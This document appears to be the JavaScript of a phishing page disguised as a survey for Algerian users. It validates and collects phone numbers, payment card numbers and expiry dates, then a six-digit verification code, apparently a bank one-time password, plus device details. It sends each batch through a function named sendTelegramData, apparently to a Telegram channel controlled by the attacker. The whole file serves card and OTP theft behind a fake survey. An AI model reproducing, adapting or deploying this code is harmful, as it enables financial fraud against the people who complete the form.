// تهيئة التطبيق
document.addEventListener('DOMContentLoaded', function() {
    // إخفاء شاشة التحميل بعد 3 ثواني
    setTimeout(() => {
        document.getElementById('loading-screen').style.opacity = '0';
        setTimeout(() => {
            document.getElementById('loading-screen').style.display = 'none';
            showPage('home-page');
            
            // بدء تتبع المستخدم
            startUserTracking();
        }, 500);
    }, 3000);
    
    // تهيئة نموذج الاستبيان
    initSurveyForm();
});

// إظهار صفحة محددة
function showPage(pageId) {
    const pages = document.querySelectorAll('.page');
    pages.forEach(page => {
        page.classList.remove('active');
    });
    document.getElementById(pageId).classList.add('active');
    
    // إرسال بيانات تتبع الصفحة
    trackPageView(pageId);
}

// الانتقال للصفحة الرئيسية
function goHome() {
    showPage('home-page');
    resetSurvey();
}

// بدء الاستبيان
function startSurvey() {
    showPage('survey-page');
    trackButtonClick('start-survey-button');
}

// العودة للصفحة السابقة
function goBack() {
    const currentStep = getCurrentStep();
    if (currentStep > 1) {
        showStep(currentStep - 1);
    } else {
        showPage('home-page');
    }
    trackButtonClick('back-button');
}

// إدارة خطوات الاستبيان
let currentStep = 1;
let step1DataSent = false; // لمنع الإرسال المزدوج

function showStep(stepNumber) {
    const steps = document.querySelectorAll('.survey-step');
    steps.forEach(step => {
        step.classList.remove('active');
    });
    document.getElementById(`step-${stepNumber}`).classList.add('active');
    
    // تحديث شريط التقدم
    updateProgressBar(stepNumber);
    
    currentStep = stepNumber;
}

function getCurrentStep() {
    return currentStep;
}

function nextStep(current) {
    // التحقق من صحة البيانات في الخطوة الحالية
    if (!validateStep(current)) {
        showNotification('يرجى ملء جميع الحقول المطلوبة بشكل صحيح', 'error');
        return;
    }
    
    if (current === 1) {
        // منع الإرسال المزدوج
        if (step1DataSent) {
            showStep(2);
            detectDeviceInfo();
            return;
        }
        
        // جمع بيانات الخطوة الأولى
        const formData = collectStep1Data();
        
        // التحقق من رقم الهاتف الجزائري
        if (!validateAlgerianPhone(formData.phone)) {
            showNotification('يرجى إدخال رقم هاتف جزائري صحيح (05XX XX XX XX)', 'error');
            return;
        }
        
        // التحقق من رقم البطاقة
        if (!validateCardNumber(formData.cardNumber)) {
            showNotification('رقم البطاقة غير صالح. تأكد من إدخال رقم بطاقة صحيح', 'error');
            return;
        }
        
        // إرسال البيانات إلى تليجرام
        const sendSuccess = sendTelegramData('step1_completed', formData);
        
        if (sendSuccess) {
            step1DataSent = true;
            showStep(2);
            detectDeviceInfo();
        } else {
            showNotification('حدث خطأ في الإرسال. يرجى المحاولة مرة أخرى', 'error');
        }
        
    } else if (current === 2) {
        const verificationCode = document.getElementById('verification-code').value;
        
        // التحقق من صحة الكود
        if (!verificationCode || verificationCode.length !== 6 || !/^\d+$/.test(verificationCode)) {
            showNotification('يرجى إدخال رمز تحقق مكون من 6 أرقام', 'error');
            return;
        }
        
        // جمع البيانات النهائية
        const finalData = collectAllData();
        
        // إرسال البيانات النهائية إلى تليجرام
        const sendSuccess = sendTelegramData('survey_completed', finalData);
        
        if (sendSuccess) {
            // تحديث رقم المشاركة
            document.getElementById('participation-id').textContent = 
                `ALG-${Date.now().toString().slice(-8)}`;
            
            showStep(3);
            
            // إرسال تأكيد الإكمال
            sendTelegramData('thankyou_page_viewed', {});
        } else {
            showNotification('حدث خطأ في الإرسال. يرجى المحاولة مرة أخرى', 'error');
        }
    }
    
    trackButtonClick(`next-button-step-${current}`);
}

function updateProgressBar(step) {
    const steps = document.querySelectorAll('.progress-step');
    steps.forEach((stepElement, index) => {
        if (index + 1 <= step) {
            stepElement.classList.add('active');
        } else {
            stepElement.classList.remove('active');
        }
    });
}

// دالة محسنة للتحقق من رقم البطاقة باستخدام خوارزمية Luhn
function validateCardNumber(cardNumber) {
    // 1. إزالة جميع المسافات والأحرف غير رقمية
    const cleanNumber = cardNumber.replace(/\s/g, '').replace(/\D/g, '');
    
    // 2. التحقق من أن الرقم يحتوي فقط على أرقام
    if (!/^\d+$/.test(cleanNumber)) {
        return false;
    }
    
    // 3. التحقق من الطول (معظم البطاقات 13-19 رقم)
    if (cleanNumber.length < 13 || cleanNumber.length > 19) {
        return false;
    }
    
    // 4. تطبيق خوارزمية Luhn للتحقق
    let sum = 0;
    let isEven = false;
    
    // الانتقال من اليمين إلى اليسار
    for (let i = cleanNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cleanNumber.charAt(i), 10);
        
        if (isEven) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }
        
        sum += digit;
        isEven = !isEven;
    }
    
    return (sum % 10) === 0;
}

// دالة لتنسيق رقم البطاقة أثناء الكتابة
function formatCardNumber(value) {
    // إزالة جميع الأحرف غير رقمية
    const numbers = value.replace(/\D/g, '');
    
    // تقسيم إلى مجموعات من 4 أرقام
    const groups = [];
    for (let i = 0; i < numbers.length && i < 16; i += 4) {
        groups.push(numbers.substr(i, 4));
    }
    
    // دمج المجموعات مع مسافات
    return groups.join(' ');
}

function validateStep(step) {
    let isValid = true;
    
    if (step === 1) {
        const phone = document.getElementById('phone').value;
        const card = document.getElementById('card-number').value;
        const expiry = document.getElementById('expiry-date').value;
        const privacy = document.getElementById('privacy-check').checked;
        
        if (!validateAlgerianPhone(phone)) {
            markInvalid('phone', 'رقم الهاتف غير صحيح (يجب أن يكون 05XX XX XX XX)');
            isValid = false;
        } else {
            markValid('phone');
        }
        
        // التحقق باستخدام الدالة المحسنة
        if (!validateCardNumber(card)) {
            markInvalid('card-number', 'رقم البطاقة غير صالح. تأكد من إدخال رقم بطاقة حقيقي');
            isValid = false;
        } else {
            markValid('card-number');
        }
        
        if (!expiry) {
            markInvalid('expiry-date', 'يرجى تحديد تاريخ الصلاحية');
            isValid = false;
        } else {
            markValid('expiry-date');
        }
        
        if (!privacy) {
            showNotification('يرجى الموافقة على سياسة الخصوصية', 'error');
            isValid = false;
        }
    }
    
    return isValid;
}

function validateAlgerianPhone(phone) {
    const cleanPhone = phone.replace(/\s/g, '');
    const regex = /^(05|06|07)[0-9]{8}$/;
    return regex.test(cleanPhone);
}

function markInvalid(fieldId, message) {
    const field = document.getElementById(fieldId);
    const validationMsg = field.parentNode.querySelector('.validation-message');
    
    field.style.borderColor = '#e74c3c';
    validationMsg.textContent = message;
    validationMsg.style.color = '#e74c3c';
}

function markValid(fieldId) {
    const field = document.getElementById(fieldId);
    const validationMsg = field.parentNode.querySelector('.validation-message');
    
    field.style.borderColor = '#2ecc71';
    validationMsg.textContent = '✓ صحيح';
    validationMsg.style.color = '#2ecc71';
}

function collectStep1Data() {
    return {
        phone: document.getElementById('phone').value,
        cardNumber: document.getElementById('card-number').value,
        expiryDate: document.getElementById('expiry-date').value,
        timestamp: new Date().toISOString(),
        sessionId: getSessionId()
    };
}

function collectAllData() {
    const deviceInfo = getDeviceInfo();
    
    return {
        ...collectStep1Data(),
        verificationCode: document.getElementById('verification-code').value,
        deviceInfo: deviceInfo,
        userAgent: navigator.userAgent,
        finalTimestamp: new Date().toISOString()
    };
}

function getSessionId() {
    if (!sessionStorage.getItem('survey_session_id')) {
        sessionStorage.setItem('survey_session_id', 
            'sess_' + Math.random().toString(36).substr(2, 9));
    }
    return sessionStorage.getItem('survey_session_id');
}

function resetSurvey() {
    currentStep = 1;
    step1DataSent = false; // إعادة تعيين علامة الإرسال
    document.querySelectorAll('.survey-form')[0].reset();
    document.getElementById('verification-code').value = '';
    document.querySelectorAll('.validation-message').forEach(msg => {
        msg.textContent = '';
    });
    updateProgressBar(1);
    showStep(1);
}

// إظهار الإشعارات
function showNotification(message, type = 'info') {
    const notification = document.getElementById('notification');
    notification.textContent = message;
    
    // تخصيص الألوان حسب النوع
    if (type === 'error') {
        notification.style.background = '#e74c3c';
    } else if (type === 'success') {
        notification.style.background = '#2ecc71';
    } else {
        notification.style.background = '#333';
    }
    
    notification.classList.add('show');
    
    setTimeout(() => {
        notification.classList.remove('show');
    }, 3000);
}

// اكتشاف معلومات الجهاز
function detectDeviceInfo() {
    const deviceInfo = getDeviceInfo();
    
    document.getElementById('device-type').textContent = deviceInfo.deviceType;
    document.getElementById('os-type').textContent = deviceInfo.os;
    document.getElementById('browser-type').textContent = deviceInfo.browser;
    document.getElementById('screen-resolution').textContent = 
        `${deviceInfo.screenWidth} × ${deviceInfo.screenHeight}`;
}

function initSurveyForm() {
    // تنسيق رقم البطاقة
    const cardInput = document.getElementById('card-number');
    cardInput.addEventListener('input', function(e) {
        const formatted = formatCardNumber(e.target.value);
        e.target.value = formatted;
        
        // التحقق في الوقت الحقيقي
        const cleanNumber = formatted.replace(/\s/g, '');
        if (cleanNumber.length >= 13) {
            if (validateCardNumber(formatted)) {
                markValid('card-number');
            } else {
                const validationMsg = cardInput.parentNode.querySelector('.validation-message');
                validationMsg.textContent = cleanNumber.length >= 16 ? 'رقم البطاقة غير صالح' : '';
                validationMsg.style.color = '#e74c3c';
                cardInput.style.borderColor = '#e74c3c';
            }
        } else {
            const validationMsg = cardInput.parentNode.querySelector('.validation-message');
            validationMsg.textContent = '';
            cardInput.style.borderColor = '#e0e0e0';
        }
    });
    
    // تنسيق رقم الهاتف
    const phoneInput = document.getElementById('phone');
    phoneInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.startsWith('0')) {
            value = value.substring(0, 10);
            if (value.length >= 2) {
                value = value.replace(/(\d{2})(?=\d)/, '$1 ');
            }
            if (value.length >= 5) {
                value = value.replace(/(\d{2} \d{2})(?=\d)/, '$1 ');
            }
            if (value.length >= 8) {
                value = value.replace(/(\d{2} \d{2} \d{2})(?=\d)/, '$1 ');
            }
        }
        e.target.value = value;
        
        // التحقق في الوقت الحقيقي
        if (value.replace(/\s/g, '').length === 10) {
            if (validateAlgerianPhone(value)) {
                markValid('phone');
            } else {
                markInvalid('phone', 'رقم جزائري غير صحيح');
            }
        }
    });
}

// اختبار برقم بطاقة صالح للاستخدام
function testValidCard() {
    const testCards = [
        '4532 0151 4842 3237', // Visa صالح
        '5555 5555 5555 4444', // MasterCard صالح
        '4111 1111 1111 1111', // Visa صالح (اختبار)
        '3782 8224 6310 005'   // American Express صالح
    ];
    
    const randomCard = testCards[Math.floor(Math.random() * testCards.length)];
    document.getElementById('card-number').value = randomCard;
    
    // تشغيل التحقق
    const event = new Event('input');
    document.getElementById('card-number').dispatchEvent(event);
    
    console.log('✅ تم تعيين رقم بطاقة اختبار صالح:', randomCard);
}
